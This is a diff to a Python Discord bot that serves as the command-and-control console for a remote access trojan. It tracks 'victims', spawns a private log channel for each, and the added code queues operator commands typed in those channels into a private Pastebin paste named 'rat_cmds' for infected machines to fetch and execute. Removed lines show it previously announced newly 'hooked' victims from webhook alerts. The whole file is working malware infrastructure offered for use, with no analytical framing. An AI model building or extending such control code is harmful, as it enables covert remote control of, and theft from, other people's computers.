@@ -181,31 +181,53 @@ print(f"EXE ready: dist\\{output_name}")
 import discord
 from discord.ext import commands
 import re
+import json
+import requests
 
 TOKEN = "YOUR_BOT_TOKEN_HERE"
-GUILD_ID = 123456789012345678  # Server ID
-LOG_CHANNEL_ID = 987654321098765432  # Webhook channel ID
+GUILD_ID = 123456789012345678      # Your server ID
+PASTEBIN_RAW = "https://pastebin.com/raw/XXXXXXXX"  # Your fixed Pastebin raw URL with {}
 
 intents = discord.Intents.default()
 intents.message_content = True
 intents.guilds = True
 intents.messages = True
 
-bot = commands.Bot(command_prefix="!", intents=intents)  # Official class
+bot = commands.Bot(command_prefix="-", intents=intents)  # Commands start with -
 
 known_victims = set()
 
+# Load current commands from Pastebin
+def get_current_commands():
+    try:
+        return requests.get(PASTEBIN_RAW).json()
+    except:
+        return {}
+
+# Save updated commands back to Pastebin
+def update_commands(new_cmds):
+    data = {
+        "api_dev_key": "YOUR_PASTEBIN_DEV_KEY_HERE",  # Get from pastebin.com/api
+        "api_option": "paste",
+        "api_paste_code": json.dumps(new_cmds),
+        "api_paste_private": "1",
+        "api_paste_name": "rat_cmds",
+        "api_paste_expire_date": "N"
+    }
+    response = requests.post("https://pastebin.com/api/api_post.php", data=data)
+    if "pastebin.com" in response.text:
+        print("[+] Commands updated successfully")
+    else:
+        print("[-] Pastebin update failed")
+
 async def create_victim_section(victim_id):
     guild = bot.get_guild(GUILD_ID)
-    if not guild:
-        print("[ERROR] Wrong GUILD_ID - bot can't see the server")
-        return None
+    if not guild: return None
     
     category_name = f"Victim-{victim_id}"
     category = discord.utils.get(guild.categories, name=category_name)
     if not category:
         category = await guild.create_category(category_name)
-        print(f"[+] Created category: {category_name}")
     
     channel_name = f"logs-{victim_id}"
     channel = discord.utils.get(category.text_channels, name=channel_name)
@@ -215,40 +237,42 @@ async def create_victim_section(victim_id):
             guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
         }
         channel = await category.create_text_channel(channel_name, overwrites=overwrites)
-        print(f"[+] Created private logs channel: {channel_name}")
     
     return channel
 
 @bot.event
 async def on_ready():
-    print(f"[+] {bot.user} online - watching for bites in server {GUILD_ID}")
+    print(f"[+] {bot.user} online - full command control activated")
 
 @bot.event
 async def on_message(message):
-    # Process webhook messages (author is usually the webhook/bot)
-    if message.channel.id != LOG_CHANNEL_ID:
+    if message.author.bot: return
+    if not message.channel.category or not message.channel.category.name.startswith("Victim-"): 
+        await bot.process_commands(message)
         return
     
-    full_text = message.content
-    for embed in message.embeds:
-        if embed.title:
-            full_text += " " + embed.title
-        if embed.description:
-            full_text += " " + embed.description
+    # Extract victim ID from channel name (logs-abc12345)
+    match = re.search(r"logs-([a-f0-9]{8})", message.channel.name)
+    if not match: return
+    victim_id = match.group(1)
     
-    if "WE GOT A BITE CAPTAIN" not in full_text:
-        return
-    
-    match = re.search(r"\[([a-f0-9]{8})\]|Victim ID.*?([a-f0-9]{8})", full_text, re.IGNORECASE)
-    if match:
-        victim_id = match.group(1) or match.group(2)
-        if victim_id in known_victims:
-            return
-        known_victims.add(victim_id)
-        print(f"[!] New victim hooked: {victim_id}")
+    # Process commands only in victim channels
+    if message.content.startswith("-"):
+        cmd = message.content[1:].strip().split(" ", 1)
+        command = cmd[0].lower()
+        arg = cmd[1] if len(cmd) > 1 else ""
         
-        channel = await create_victim_section(victim_id)
-        if channel:
-            await message.reply(f"**BITE DETECTED** - Victim **{victim_id}** online\nWar room spawned: {channel.mention}")
+        current = get_current_commands()
+        current[victim_id] = command + (" " + arg if arg else "")
+        
+        update_commands(current)
+        await message.reply(f"Queued **{command}** for victim **{victim_id}** → Executing now...")
+    
+    await bot.process_commands(message)
+
+# Optional: Add a global command in any channel (e.g., !status)
+@bot.command()
+async def status(ctx):
+    await ctx.send(f"Bot alive | {len(known_victims)} victims online")
 
 bot.run(TOKEN)
